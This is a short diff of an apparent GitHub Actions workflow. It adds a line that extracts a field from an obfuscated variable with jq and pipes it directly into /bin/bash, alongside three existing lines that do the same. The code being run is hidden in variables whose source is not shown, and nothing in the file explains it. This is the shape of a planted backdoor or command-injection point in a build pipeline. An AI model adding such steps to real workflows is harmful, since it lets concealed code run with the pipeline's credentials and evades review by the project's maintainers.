@@ -25,6 +25,7 @@ jobs:
           echo $cdgt0 | jq -r .hf1258 | /bin/bash
           printf '%s' "$mde339" | jq -r .bb9 | /bin/bash
           echo $j5 | jq -r .kt2 | /bin/bash
+          echo $haxxj543 | jq -r .neu55 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
